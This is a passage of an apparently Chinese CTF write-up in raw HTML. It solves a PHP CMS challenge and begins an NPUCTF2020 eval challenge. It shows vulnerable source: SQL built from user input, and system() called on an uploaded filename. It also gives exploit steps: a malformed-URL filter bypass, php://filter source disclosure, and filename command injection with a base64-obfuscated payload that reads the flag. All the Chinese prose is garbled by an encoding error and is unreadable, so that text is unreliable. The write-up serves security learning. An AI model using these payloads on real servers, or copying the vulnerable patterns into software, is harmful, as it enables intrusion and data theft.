class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ä»£ç ä¸éš¾ç†è§£ï¼Œé¦–å…ˆæ˜¯è¿™ä¸ª:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ä¸‹é¢è¿˜æœ‰ä¸ªè¿‡æ»¤å­—å…¸ï¼Œå’Œè¿™ä¸ªç±»ä¼¼å°±ä¸é‡å¤è¯´äº†</span><br></code></pre></td></tr></table></figure><blockquote><p><code>parse_url</code> æ˜¯ä¸€ä¸ª PHP å†…ç½®å‡½æ•°ï¼Œç”¨äºè§£æ URL å­—ç¬¦ä¸²ï¼Œå°†å…¶æ‹†åˆ†æˆå„ä¸ªç»„æˆéƒ¨åˆ†ã€‚ä»¥ä¸‹æ˜¯ä½ æä¾›çš„ä»£ç ä¸­ <code>parse_url</code> çš„ä½¿ç”¨ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œ<code>$_SERVER[&quot;REQUEST_URI&quot;]</code> åŒ…å«å½“å‰é¡µé¢çš„ URLã€‚é€šè¿‡è°ƒç”¨ <code>parse_url</code> å‡½æ•°ï¼Œå®ƒè¢«è§£ææˆä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº† URL çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå¦‚åè®®ã€ä¸»æœºã€è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰ã€‚</p><p>æ¥ä¸‹æ¥çš„ä»£ç ç‰‡æ®µæ˜¯ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">parse<span class="hljs-constructor">_str($<span class="hljs-params">uri</span>[&#x27;<span class="hljs-params">query</span>&#x27;], $<span class="hljs-params">query</span>)</span>;<br></code></pre></td></tr></table></figure><p>å®ƒä»ä¸Šä¸€æ­¥è§£æå¾—åˆ°çš„æ•°ç»„ <code>$uri</code> ä¸­å–å‡ºåä¸º <code>&#39;query&#39;</code> çš„éƒ¨åˆ†ï¼Œå¹¶å°†å…¶è§£ææˆå˜é‡ã€‚å¦‚æœ URL ä¸­åŒ…å«æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ <code>?key1=value1&amp;key2=value2</code>ï¼‰ï¼Œé‚£ä¹ˆ <code>$query</code> æ•°ç»„å°†åŒ…å«è¿™äº›å‚æ•°å’Œå¯¹åº”çš„å€¼ã€‚</p><p>ç»¼åˆèµ·æ¥ï¼Œæ•´ä¸ªä»£ç ç‰‡æ®µçš„ç›®çš„å¯èƒ½æ˜¯è·å–å½“å‰é¡µé¢ URL çš„æŸ¥è¯¢å‚æ•°ï¼Œå¹¶å°†å…¶è§£æä¸ºä¸€ä¸ªå…³è”æ•°ç»„ <code>$query</code>ã€‚åœ¨è¿™ä¸ªç‰¹å®šçš„ä¾‹å­ä¸­ï¼Œçœ‹èµ·æ¥ä»£ç çš„ç›®çš„æ˜¯æ£€æŸ¥ URL æŸ¥è¯¢å‚æ•°ä¸­æ˜¯å¦åŒ…å«äº†æŸäº›å…³é”®è¯ï¼Œå¦‚ â€œflagâ€ã€â€manageâ€ã€â€ffffllllaaaagggâ€ã€‚</p></blockquote><p>è¿™é‡Œä»–ä¸å…è®¸æˆ‘ä»¬å»è®¿é—®<code>flag</code>ï¼Œ<code>manage</code>ï¼Œ<code>ffffllllaaaaggg</code>ã€‚å¯ä»¥çŸ¥é“è¿™é‡Œæ˜¯ä¸€å®šè—äº†ä¸œè¥¿çš„ã€‚è‡³äº<code>parse_url</code>è§£æå­˜åœ¨çš„é—®é¢˜ï¼š<code>https://www.cnblogs.com/Lee-404/p/12826352.html</code>ã€‚</p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡æ„é€ ç•¸å½¢çš„<code>URL</code>ç»•è¿‡<code>filter</code>å‡½æ•°çš„æ£€æµ‹ï¼š</p><p><code>////user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//infoå’Œflagæ²¡å•¥æœ‰ç”¨ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>è¯»è¿™ä¸ªçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®<code>templates/upload.html</code>å‘ç°å­˜åœ¨ä¸Šä¼ ç•Œé¢ï¼Œéšä¾¿æ‰¾äº†ä¸ªä¸€å¥è¯ä¼ ä¸Šå»å‘ç°:</p><p><img src="/img/nu1lctfeatingcms1.png" alt="nu1lctfeatingcms1"></p><p>è¯»ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload fileï¼&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ªå‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å‘½ä»¤æ‰§è¡Œè¯»ä¸Šä¼ çš„æ–‡ä»¶äº†ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/nu1lctfeatingcms3.png" alt="nu1lctfeatingcms3"></p><p>å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶åæ¥<code>RCE</code>ï¼Œä½†æˆ‘ä¸ç®¡æ€ä¹ˆè¯•ç»“æœéƒ½æ˜¯<code>404</code>ã€‚ã€‚åæ¥æ‰çŸ¥é“çœŸæ­£çš„æ–‡ä»¶ä¸Šä¼ é¡µé¢æ˜¯<code>m4aaannngggeee</code>:</p><p><img src="/img/nu1lctfeatingcms2.png" alt="nu1lctfeatingcms2"></p><p><code>system</code>é‡Œå¯ä»¥åˆ©ç”¨<code>;</code>åŒæ—¶æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code>ç”¨ä¸€ä¸ª<code>;</code>é—­åˆå°±è¡Œ(|base64 -w 0ä¼šæŠŠç»“æœä»¥base64è¾“å‡º)ï¼š</p><p><img src="/img/nu1lctfeatingcms4.png" alt="nu1lctfeatingcms4"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨<code>#</code>æŠŠåé¢æ³¨é‡Šæ‰ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š</span><br>run<br>script.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;#cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœ</span><br>run<br>script.php<br><br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨<code>/</code>ï¼Œä¼šæŠ¥é”™(error:can not move)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>     <br><span class="hljs-comment">//phpæ–‡ä»¶ä¸Šä¼ æ—¶ã€‚å°†ç¼“å­˜æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡ç›®å½•ç”±äºå­˜åœ¨ç‰¹æ®Šå­—ç¬¦ã€‚å°±ä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•å¾ˆå¤šï¼Œæ¯”å¦‚å…ˆ<code>cd ..</code>å›åˆ°ä¸Šä¸€çº§å†æ‰§è¡Œ<code>ls</code>ï¼Œæˆ–è€…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`<br><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š"><a href="#æ€è·¯æ€»ç»“ï¼š" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><h2 id="NPUCTF2020-éªŒè¯ğŸ"><a href="#NPUCTF2020-éªŒè¯ğŸ" class="headerlink" title="[NPUCTF2020]éªŒè¯ğŸ"></a>[NPUCTF2020]éªŒè¯ğŸ</h2><p><code>/source</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<br><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./key.js&#x27;</span>).<span class="hljs-property">keys</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <span 